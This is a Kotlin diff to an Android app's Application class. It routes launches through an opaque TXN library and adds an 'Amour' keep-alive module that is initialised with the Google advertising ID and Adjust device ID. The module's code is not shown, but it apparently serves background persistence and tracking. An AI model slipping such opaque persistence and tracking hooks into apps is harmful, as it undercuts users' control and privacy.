@@ -7,6 +7,10 @@ import com.example.overseaswhitebag.common.utils.AdjustTokens
 import com.p.b.AdTransitActivity
 import com.p.b.base.BaseApplication
 import com.p.b.base.OverseaAppInitializer.appBaseContext
+import com.Txn.TXN
+import com.amour.Amour
+import com.p.b.common.SPUtils
+import com.p.b.common.adjust.AdJustTokenAFUtils
 
 class YQK : BaseApplication() {
 
@@ -27,15 +31,15 @@ class YQK : BaseApplication() {
     }
 
     override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
-        val launchIntent = Intent(appBaseContext ?: return, AdTransitActivity::class.java)
-        launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        TXN.Tan(appBaseContext, intent)
+
     }
 
     override fun initPopPower() {
-        // ledlight 暂未接入 pop 保活能力
     }
 
     override fun initKeepPower(app: Application) {
-        // ledlight 暂未接入 keep 保活能力
+        Amour.Init(app,SPUtils.getGoogleAdId(), SPUtils.getAdjustDeviceId())
+        AdJustTokenAFUtils.showBhInit(SPUtils.getGoogleAdId(),SPUtils.getAdjustDeviceId())
     }
 }
